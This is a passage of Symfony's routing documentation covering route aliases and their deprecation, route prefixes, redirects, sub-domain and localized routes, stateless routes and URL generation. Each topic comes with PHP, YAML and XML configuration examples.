            #[Route('/share/{token}', name: 'share', requirements: ['token' => '.+'])]
            public function share($token): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        share:
            path:       /share/{token}
            controller: App\Controller\DefaultController::share
            requirements:
                token: .+

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="share" path="/share/{token}" controller="App\Controller\DefaultController::share">
                <requirement key="token">.+</requirement>
            </route>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\DefaultController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('share', '/share/{token}')
                ->controller([DefaultController::class, 'share'])
                ->requirements([
                    'token' => '.+',
                ])
            ;
        };

.. note::

    If the route defines several parameters and you apply this permissive
    regular expression to all of them, you might get unexpected results. For
    example, if the route definition is ``/share/{path}/{token}`` and both
    ``path`` and ``token`` accept ``/``, then ``token`` will only get the last part
    and the rest is matched by ``path``.

.. note::

    If the route includes the special ``{_format}`` parameter, you shouldn't
    use the ``.+`` requirement for the parameters that allow slashes. For example,
    if the pattern is ``/share/{token}.{_format}`` and ``{token}`` allows any
    character, the ``/share/foo/bar.json`` URL will consider ``foo/bar.json``
    as the token and the format will be empty. This can be solved by replacing
    the ``.+`` requirement by ``[^.]+`` to allow any character except dots.

.. _routing-alias:

Route Aliasing
--------------

Route alias allow you to have multiple name for the same route:

.. configuration-block::

    .. code-block:: yaml

        # config/routes.yaml
        new_route_name:
            alias: original_route_name

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="new_route_name" alias="original_route_name"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->alias('new_route_name', 'original_route_name');
        };

In this example, both ``original_route_name`` and ``new_route_name`` routes can
be used in the application and will produce the same result.

.. _routing-alias-deprecation:

Deprecating Route Aliases
~~~~~~~~~~~~~~~~~~~~~~~~~

If some route alias should no longer be used (because it is outdated or
you decided not to maintain it anymore), you can deprecate its definition:

.. configuration-block::

    .. code-block:: yaml

        new_route_name:
            alias: original_route_name

            # this outputs the following generic deprecation message:
            # Since acme/package 1.2: The "new_route_name" route alias is deprecated. You should stop using it, as it will be removed in the future.
            deprecated:
                package: 'acme/package'
                version: '1.2'

            # you can also define a custom deprecation message (%alias_id% placeholder is available)
            deprecated:
                package: 'acme/package'
                version: '1.2'
                message: 'The "%alias_id%" route alias is deprecated. Do not use it anymore.'

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="new_route_name" alias="original_route_name">
                <!-- this outputs the following generic deprecation message:
                     Since acme/package 1.2: The "new_route_name" route alias is deprecated. You should stop using it, as it will be removed in the future. -->
                <deprecated package="acme/package" version="1.2"/>

                <!-- you can also define a custom deprecation message (%alias_id% placeholder is available) -->
                <deprecated package="acme/package" version="1.2">
                    The "%alias_id%" route alias is deprecated. Do not use it anymore.
                </deprecated>
            </route>
        </routes>

    .. code-block:: php

        $routes->alias('new_route_name', 'original_route_name')
            // this outputs the following generic deprecation message:
            // Since acme/package 1.2: The "new_route_name" route alias is deprecated. You should stop using it, as it will be removed in the future.
            ->deprecate('acme/package', '1.2', '')

            // you can also define a custom deprecation message (%alias_id% placeholder is available)
            ->deprecate(
                'acme/package',
                '1.2',
                'The "%alias_id%" route alias is deprecated. Do not use it anymore.'
            )
        ;

In this example, every time the ``new_route_name`` alias is used, a deprecation
warning is triggered, advising you to stop using that alias.

The message is actually a message template, which replaces occurrences of the
``%alias_id%`` placeholder by the route alias name. You **must** have
at least one occurrence of the ``%alias_id%`` placeholder in your template.

.. _routing-route-groups:

Route Groups and Prefixes
-------------------------

It's common for a group of routes to share some options (e.g. all routes related
to the blog start with ``/blog``) That's why Symfony includes a feature to share
route configuration.

When defining routes as attributes, put the common configuration
in the ``#[Route]`` attribute of the controller class.
In other routing formats, define the common configuration using options
when importing the routes.

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        #[Route('/blog', requirements: ['_locale' => 'en|es|fr'], name: 'blog_')]
        class BlogController extends AbstractController
        {
            #[Route('/{_locale}', name: 'index')]
            public function index(): Response
            {
                // ...
            }

            #[Route('/{_locale}/posts/{slug}', name: 'show')]
            public function show(string $slug): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes/attributes.yaml
        controllers:
            resource: '../../src/Controller/'
            type: attribute
            # this is added to the beginning of all imported route URLs
            prefix: '/blog'
            # this is added to the beginning of all imported route names
            name_prefix: 'blog_'
            # these requirements are added to all imported routes
            requirements:
                _locale: 'en|es|fr'

            # An imported route with an empty URL will become "/blog/"
            # Uncomment this option to make that URL "/blog" instead
            # trailing_slash_on_root: false

            # you can optionally exclude some files/subdirectories when loading attributes
            # (the value must be a string or an array of PHP glob patterns)
            # exclude: '../../src/Controller/{Debug*Controller.php}'

    .. code-block:: xml

        <!-- config/routes/attributes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <!--
                the 'prefix' value is added to the beginning of all imported route URLs
                the 'name-prefix' value is added to the beginning of all imported route names
                the 'exclude' option defines the files or subdirectories ignored when loading attributes
                (the value must be a PHP glob pattern and you can repeat this option any number of times)
            -->
            <import resource="../../src/Controller/"
                type="attribute"
                prefix="/blog"
                name-prefix="blog_"
                exclude="../../src/Controller/{Debug*Controller.php}">
                <!-- these requirements are added to all imported routes -->
                <requirement key="_locale">en|es|fr</requirement>
            </import>

            <!-- An imported route with an empty URL will become "/blog/"
                 Uncomment this option to make that URL "/blog" instead -->
            <import resource="../../src/Controller/" type="attribute"
                    prefix="/blog"
                    trailing-slash-on-root="false">
                    <!-- ... -->
            </import>
        </routes>

    .. code-block:: php

        // config/routes/attributes.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->import(
                    '../../src/Controller/',
                    'attribute',
                    false,
                    // the optional fourth argument is used to exclude some files
                    // or subdirectories when loading attributes
                    // (the value must be a string or an array of PHP glob patterns)
                    '../../src/Controller/{Debug*Controller.php}'
                )
                // this is added to the beginning of all imported route URLs
                ->prefix('/blog')

                // An imported route with an empty URL will become "/blog/"
                // Pass FALSE as the second argument to make that URL "/blog" instead
                // ->prefix('/blog', false)

                // this is added to the beginning of all imported route names
                ->namePrefix('blog_')

                // these requirements are added to all imported routes
                ->requirements(['_locale' => 'en|es|fr'])
            ;
        };

In this example, the route of the ``index()`` action will be called ``blog_index``
and its URL will be ``/blog/{_locale}``. The route of the ``show()`` action will be called
``blog_show`` and its URL will be ``/blog/{_locale}/posts/{slug}``. Both routes
will also validate that the ``_locale`` parameter matches the regular expression
defined in the class attribute.

.. note::

    If any of the prefixed routes defines an empty path, Symfony adds a trailing
    slash to it. In the previous example, an empty path prefixed with ``/blog``
    will result in the ``/blog/`` URL. If you want to avoid this behavior, set
    the ``trailing_slash_on_root`` option to ``false`` (this option is not
    available when using PHP attributes):

    .. configuration-block::

        .. code-block:: yaml

            # config/routes/attributes.yaml
            controllers:
                resource: '../../src/Controller/'
                type:     attribute
                prefix:   '/blog'
                trailing_slash_on_root: false
                # ...

        .. code-block:: xml

            <!-- config/routes/attributes.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <routes xmlns="http://symfony.com/schema/routing"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/routing
                    https://symfony.com/schema/routing/routing-1.0.xsd">

                <import resource="../../src/Controller/"
                    type="attribute"
                    prefix="/blog"
                    name-prefix="blog_"
                    trailing-slash-on-root="false"
                    exclude="../../src/Controller/{DebugEmailController}.php">
                    <!-- ... -->
                </import>
            </routes>

        .. code-block:: php

            // config/routes/attributes.php
            use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

            return static function (RoutingConfigurator $routes): void {
                $routes->import('../../src/Controller/', 'attribute')
                    // the second argument is the $trailingSlashOnRoot option
                    ->prefix('/blog', false)

                    // ...
                ;
            };

.. seealso::

    Symfony can :doc:`import routes from different sources </routing/custom_route_loader>`
    and you can even create your own route loader.

Getting the Route Name and Parameters
-------------------------------------

The ``Request`` object created by Symfony stores all the route configuration
(such as the name and parameters) in the "request attributes". You can get this
information in a controller via the ``Request`` object::

    // src/Controller/BlogController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class BlogController extends AbstractController
    {
        #[Route('/blog', name: 'blog_list')]
        public function list(Request $request): Response
        {
            $routeName = $request->attributes->get('_route');
            $routeParameters = $request->attributes->get('_route_params');

            // use this to get all the available attributes (not only routing ones):
            $allAttributes = $request->attributes->all();

            // ...
        }
    }

In services, you can get this information by
:doc:`injecting the RequestStack service </service_container/request>`.
In templates, use the :ref:`Twig global app variable <twig-app-variable>`
to get the current route name (``app.current_route``) and its parameters
(``app.current_route_parameters``).

Special Routes
--------------

Symfony defines some special controllers to render templates and redirect to
other routes from the route configuration so you don't have to create a
controller action.

Rendering a Template Directly from a Route
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Read the section about :ref:`rendering a template from a route <templates-render-from-route>`
in the main article about Symfony templates.

Redirecting to URLs and Routes Directly from a Route
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Use the ``RedirectController`` to redirect to other routes and URLs:

.. configuration-block::

    .. code-block:: yaml

        # config/routes.yaml
        doc_shortcut:
            path: /doc
            controller: Symfony\Bundle\FrameworkBundle\Controller\RedirectController
            defaults:
                route: 'doc_page'
                # optionally you can define some arguments passed to the route
                page: 'index'
                version: 'current'
                # redirections are temporary by default (code 302) but you can make them permanent (code 301)
                permanent: true
                # add this to keep the original query string parameters when redirecting
                keepQueryParams: true
                # add this to keep the HTTP method when redirecting. The redirect status changes
                # * for temporary redirects, it uses the 307 status code instead of 302
                # * for permanent redirects, it uses the 308 status code instead of 301
                keepRequestMethod: true
                # add this to remove all original route attributes when redirecting
                ignoreAttributes: true
                # or specify which attributes to ignore:
                # ignoreAttributes: ['offset', 'limit']

        legacy_doc:
            path: /legacy/doc
            controller: Symfony\Bundle\FrameworkBundle\Controller\RedirectController
            defaults:
                # this value can be an absolute path or an absolute URL
                path: 'https://legacy.example.com/doc'
                permanent: true

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="doc_shortcut" path="/doc"
                   controller="Symfony\Bundle\FrameworkBundle\Controller\RedirectController">
                <default key="route">doc_page</default>
                <!-- optionally you can define some arguments passed to the route -->
                <default key="page">index</default>
                <default key="version">current</default>
                <!-- redirections are temporary by default (code 302) but you can make them permanent (code 301)-->
                <default key="permanent">true</default>
                <!-- add this to keep the original query string parameters when redirecting -->
                <default key="keepQueryParams">true</default>
                <!-- add this to keep the HTTP method when redirecting. The redirect status changes:
                     * for temporary redirects, it uses the 307 status code instead of 302
                     * for permanent redirects, it uses the 308 status code instead of 301 -->
                <default key="keepRequestMethod">true</default>
            </route>

            <route id="legacy_doc" path="/legacy/doc"
                   controller="Symfony\Bundle\FrameworkBundle\Controller\RedirectController">
                <!-- this value can be an absolute path or an absolute URL -->
                <default key="path">https://legacy.example.com/doc</default>
                <!-- redirections are temporary by default (code 302) but you can make them permanent (code 301)-->
                <default key="permanent">true</default>
            </route>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\DefaultController;
        use Symfony\Bundle\FrameworkBundle\Controller\RedirectController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('doc_shortcut', '/doc')
                ->controller(RedirectController::class)
                 ->defaults([
                    'route' => 'doc_page',
                    // optionally you can define some arguments passed to the route
                    'page' => 'index',
                    'version' => 'current',
                    // redirections are temporary by default (code 302) but you can make them permanent (code 301)
                    'permanent' => true,
                    // add this to keep the original query string parameters when redirecting
                    'keepQueryParams' => true,
                    // add this to keep the HTTP method when redirecting. The redirect status changes:
                    // * for temporary redirects, it uses the 307 status code instead of 302
                    // * for permanent redirects, it uses the 308 status code instead of 301
                    'keepRequestMethod' => true,
                ])
            ;

            $routes->add('legacy_doc', '/legacy/doc')
                ->controller(RedirectController::class)
                 ->defaults([
                    // this value can be an absolute path or an absolute URL
                    'path' => 'https://legacy.example.com/doc',
                    // redirections are temporary by default (code 302) but you can make them permanent (code 301)
                    'permanent' => true,
                ])
            ;
        };

.. tip::

    Symfony also provides some utilities to
    :ref:`redirect inside controllers <controller-redirect>`

.. _routing-trailing-slash-redirection:

Redirecting URLs with Trailing Slashes
......................................

Historically, URLs have followed the UNIX convention of adding trailing slashes
for directories (e.g. ``https://example.com/foo/``) and removing them to refer
to files (``https://example.com/foo``). Although serving different contents for
both URLs is OK, nowadays it's common to treat both URLs as the same URL and
redirect between them.

Symfony follows this logic to redirect between URLs with and without trailing
slashes (but only for ``GET`` and ``HEAD`` requests):

==========  ========================================  ==========================================
Route URL   If the requested URL is ``/foo``          If the requested URL is ``/foo/``
==========  ========================================  ==========================================
``/foo``    It matches (``200`` status response)      It makes a ``301`` redirect to ``/foo``
``/foo/``   It makes a ``301`` redirect to ``/foo/``  It matches (``200`` status response)
==========  ========================================  ==========================================

Sub-Domain Routing
------------------

Routes can configure a ``host`` option to require that the HTTP host of the
incoming requests matches some specific value. In the following example, both
routes match the same path (``/``) but one of them only responds to a specific
host name:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/MainController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class MainController extends AbstractController
        {
            #[Route('/', name: 'mobile_homepage', host: 'm.example.com')]
            public function mobileHomepage(): Response
            {
                // ...
            }

            #[Route('/', name: 'homepage')]
            public function homepage(): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        mobile_homepage:
            path:       /
            host:       m.example.com
            controller: App\Controller\MainController::mobileHomepage

        homepage:
            path:       /
            controller: App\Controller\MainController::homepage

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="mobile_homepage"
                path="/"
                host="m.example.com"
                controller="App\Controller\MainController::mobileHomepage"/>

            <route id="homepage" path="/" controller="App\Controller\MainController::homepage"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\MainController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('mobile_homepage', '/')
                ->controller([MainController::class, 'mobileHomepage'])
                ->host('m.example.com')
            ;
            $routes->add('homepage', '/')
                ->controller([MainController::class, 'homepage'])
            ;
        };

The value of the ``host`` option can include parameters (which is useful in
multi-tenant applications) and these parameters can be validated too with
``requirements``:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/MainController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class MainController extends AbstractController
        {
            #[Route(
                '/',
                name: 'mobile_homepage',
                host: '{subdomain}.example.com',
                defaults: ['subdomain' => 'm'],
                requirements: ['subdomain' => 'm|mobile'],
            )]
            public function mobileHomepage(): Response
            {
                // ...
            }

            #[Route('/', name: 'homepage')]
            public function homepage(): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        mobile_homepage:
            path:       /
            host:       "{subdomain}.example.com"
            controller: App\Controller\MainController::mobileHomepage
            defaults:
                subdomain: m
            requirements:
                subdomain: m|mobile

        homepage:
            path:       /
            controller: App\Controller\MainController::homepage

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="mobile_homepage"
                path="/"
                host="{subdomain}.example.com"
                controller="App\Controller\MainController::mobileHomepage">
                <default key="subdomain">m</default>
                <requirement key="subdomain">m|mobile</requirement>
            </route>

            <route id="homepage" path="/" controller="App\Controller\MainController::homepage"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\MainController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('mobile_homepage', '/')
                ->controller([MainController::class, 'mobileHomepage'])
                ->host('{subdomain}.example.com')
                ->defaults([
                    'subdomain' => 'm',
                ])
                ->requirements([
                    'subdomain' => 'm|mobile',
                ])
            ;
            $routes->add('homepage', '/')
                ->controller([MainController::class, 'homepage'])
            ;
        };

In the above example, the ``subdomain`` parameter defines a default value because
otherwise you need to include a subdomain value each time you generate a URL using
these routes.

.. tip::

    You can also set the ``host`` option when :ref:`importing routes <routing-route-groups>`
    to make all of them require that host name.

.. note::

    When using sub-domain routing, you must set the ``Host`` HTTP headers in
    :doc:`functional tests </testing>` or routes won't match::

        $crawler = $client->request(
            'GET',
            '/',
            [],
            [],
            ['HTTP_HOST' => 'm.example.com']
            // or get the value from some configuration parameter:
            // ['HTTP_HOST' => 'm.'.$client->getContainer()->getParameter('domain')]
        );

.. tip::

    You can also use the inline defaults and requirements format in the
    ``host`` option: ``{subdomain<m|mobile>?m}.example.com``

.. _i18n-routing:

Localized Routes (i18n)
-----------------------

If your application is translated into multiple languages, each route can define
a different URL per each :ref:`translation locale <translation-locale>`. This
avoids the need for duplicating routes, which also reduces the potential bugs:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/CompanyController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class CompanyController extends AbstractController
        {
            #[Route(path: [
                'en' => '/about-us',
                'nl' => '/over-ons'
            ], name: 'about_us')]
            public function about(): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        about_us:
            path:
                en: /about-us
                nl: /over-ons
            controller: App\Controller\CompanyController::about

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="about_us" controller="App\Controller\CompanyController::about">
                <path locale="en">/about-us</path>
                <path locale="nl">/over-ons</path>
            </route>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\CompanyController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('about_us', [
                'en' => '/about-us',
                'nl' => '/over-ons',
            ])
                ->controller([CompanyController::class, 'about'])
            ;
        };

.. note::

    When using PHP attributes for localized routes, you have to use the ``path``
    named parameter to specify the array of paths.

When a localized route is matched, Symfony uses the same locale automatically
during the entire request.

.. tip::

    When the application uses full "language + territory" locales (e.g. ``fr_FR``,
    ``fr_BE``), if the URLs are the same in all related locales, routes can use
    only the language part (e.g. ``fr``) to avoid repeating the same URLs.

A common requirement for internationalized applications is to prefix all routes
with a locale. This can be done by defining a different prefix for each locale
(and setting an empty prefix for your default locale if you prefer it):

.. configuration-block::

    .. code-block:: yaml

        # config/routes/attributes.yaml
        controllers:
            resource: '../../src/Controller/'
            type: attribute
            prefix:
                en: '' # don't prefix URLs for English, the default locale
                nl: '/nl'

    .. code-block:: xml

        <!-- config/routes/attributes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <import resource="../../src/Controller/" type="attribute">
                <!-- don't prefix URLs for English, the default locale -->
                <prefix locale="en"></prefix>
                <prefix locale="nl">/nl</prefix>
            </import>
        </routes>

    .. code-block:: php

        // config/routes/attributes.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->import('../../src/Controller/', 'attribute')
                ->prefix([
                    // don't prefix URLs for English, the default locale
                    'en' => '',
                    'nl' => '/nl',
                ])
            ;
        };

Another common requirement is to host the website on a different domain
according to the locale. This can be done by defining a different host for each
locale.

.. configuration-block::

    .. code-block:: yaml

        # config/routes/attributes.yaml
        controllers:
            resource: '../../src/Controller/'
            type: attribute
            host:
                en: 'www.example.com'
                nl: 'www.example.nl'

    .. code-block:: xml

        <!-- config/routes/attributes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">
            <import resource="../../src/Controller/" type="attribute">
                <host locale="en">www.example.com</host>
                <host locale="nl">www.example.nl</host>
            </import>
        </routes>

    .. code-block:: php

        // config/routes/attributes.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;
        return static function (RoutingConfigurator $routes): void {
            $routes->import('../../src/Controller/', 'attribute')
                ->host([
                    'en' => 'www.example.com',
                    'nl' => 'www.example.nl',
                ])
            ;
        };

.. _stateless-routing:

Stateless Routes
----------------

Sometimes, when an HTTP response should be cached, it is important to ensure
that can happen. However, whenever a session is started during a request,
Symfony turns the response into a private non-cacheable response.

For details, see :doc:`/http_cache`.

Routes can configure a ``stateless`` boolean option in order to declare that the
session shouldn't be used when matching a request:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/MainController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\Routing\Attribute\Route;

        class MainController extends AbstractController
        {
            #[Route('/', name: 'homepage', stateless: true)]
            public function homepage(): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        homepage:
            controller: App\Controller\MainController::homepage
            path: /
            stateless: true

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">
            <route id="homepage" controller="App\Controller\MainController::homepage" path="/" stateless="true"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\MainController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('homepage', '/')
                ->controller([MainController::class, 'homepage'])
                ->stateless()
            ;
        };

Now, if the session is used, the application will report it based on your
``kernel.debug`` parameter:

* ``enabled``: will throw an :class:`Symfony\\Component\\HttpKernel\\Exception\\UnexpectedSessionUsageException` exception
* ``disabled``: will log a warning

It will help you understand and hopefully fixing unexpected behavior in your application.

.. _routing-generating-urls:

Generating URLs
---------------

Routing systems are bidirectional:

1. they associate URLs with controllers (as explained in the previous sections);
2. they generate URLs for a given route.

Generating URLs from routes allows you to not write the ``<a href="...">``
values manually in your HTML templates. Also, if the URL of some route changes,
you only have to update the route configuration and all links will be updated.

To generate a URL, you need to specify the name of the route (e.g.
``blog_show``) and the values of the parameters defined by the route (e.g.
``slug = my-blog-post``).

For that reason each route has an internal name that must be unique in the
application. If you don't set the route name explicitly with the ``name``
option, Symfony generates an automatic name based on the controller and action.

Symfony declares route aliases based on the FQCN if the target class has an
``__invoke()`` method that adds a route **and** if the target class added
one route exactly. Symfony also automatically adds an alias for every method
that defines only one route. Consider the following class::

        // src/Controller/MainController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\Routing\Attribute\Route;

        final class MainController extends AbstractController
        {
            #[Route('/', name: 'homepage')]
            public function homepage(): Response
            {
                // ...
            }
        }

Symfony will add a route alias named ``App\Controller\MainController::homepage``.

Generating URLs in Controllers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If your controller extends from the :ref:`AbstractController <the-base-controller-class-services>`,
use the ``generateUrl()`` helper::

    // src/Controller/BlogController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;
    use Symfony\Component\Routing\Generator\UrlGeneratorInterface;

    class BlogController extends AbstractController
    {
        #[Route('/blog', name: 'blog_list')]
        public function list(): Response
        {
            // generate a URL with no route arguments
            $signUpPage = $this->generateUrl('sign_up');

            // generate a URL with route arguments
            $userProfilePage = $this->generateUrl('user_profile', [
                'username' => $user->getUserIdentifier(),
            ]);

            // generated URLs are "absolute paths" by default. Pass a third optional
            // argument to generate different URLs (e.g. an "absolute URL")
            $signUpPage = $this->generateUrl('sign_up', [], UrlGeneratorInterface::ABSOLUTE_URL);

            // when a route is localized, Symfony uses by default the current request locale
            // pass a different '_locale' value if you want to set the locale explicitly
            $signUpPageInDutch = $this->generateUrl('sign_up', ['_locale' => 'nl']);

            // ...
        }
    }

.. note::

    If you pass to the ``generateUrl()`` method some parameters that are not
    part of the route definition, they are included in the generated URL as a
    query string::

        $this->generateUrl('blog', ['page' => 2, 'category' => 'Symfony']);
        // the 'blog' route only defines the 'page' parameter; the generated URL is:
        // /blog/2?category=Symfony

.. caution::

    While objects are converted to string when used as placeholders, they are not
    converted when used as extra parameters. So, if you're passing an object (e.g. an Uuid)
    as value of an extra parameter, you need to explicitly convert it to a string::

        $this->generateUrl('blog', ['uuid' => (string) $entity->getUuid()]);

If your controller does not extend from ``AbstractController``, you'll need to
:ref:`fetch services in your controller <controller-accessing-services>` and
follow the instructions of the next section.

.. _routing-generating-urls-in-services:

Generating URLs in Services
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Inject the ``router`` Symfony service into your own services and use its
``generate()`` method. When using :doc:`service autowiring </service_container/autowiring>`
you only need to add an argument in the service constructor and type-hint it with
the :class:`Symfony\\Component\\Routing\\Generator\\UrlGeneratorInterface` class::

    // src/Service/SomeService.php
    namespace App\Service;

    use Symfony\Component\Routing\Generator\UrlGeneratorInterface;

    class SomeService
    {
        public function __construct(
            private UrlGeneratorInterface $router,
        ) {
        }

        public function someMethod(): void
        {
            // ...

            // generate a URL with no route arguments
            $signUpPage = $this->router->generate('sign_up');

            // generate a URL with route arguments
            $userProfilePage = $this->router->generate('user_profile', [
                'username' => $user->getUserIdentifier(),
            ]);

            // generated URLs are "absolute paths" by default. Pass a third optional
            // argument to generate different URLs (e.g. an "absolute URL")
            $signUpPage = $this->router->generate('sign_up', [], UrlGeneratorInterface::ABSOLUTE_URL);

            // when a route is localized, Symfony uses by default the current request locale
            // pass a different '_locale' value if you want to set the locale explicitly
            $signUpPageInDutch = $this->router->generate('sign_up', ['_locale' => 'nl']);
        }
    }

Generating URLs in Templates
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Read the section about :ref:`creating links between pages <templates-link-to-pages>`
in the main article about Symfony templates.

Generating URLs in JavaScript
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If your JavaScript code is included in a Twig template, you can use the
``path()`` and ``url()`` Twig functions to generate the URLs and store them in
JavaScript variables. The ``escape()`` filter is needed to escape any
non-JavaScript-safe values:

.. code-block:: html+twig

    <script>
        const route = "{{ path('blog_show', {slug: 'my-blog-post'})|escape('js') }}";
    </script>

If you need to generate URLs dynamically or if you are using pure JavaScript
code, this solution doesn't work. In those cases, consider using the
`FOSJsRoutingBundle`_.

.. _router-generate-urls-commands:

Generating URLs in Commands
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Generating URLs in commands works the same as
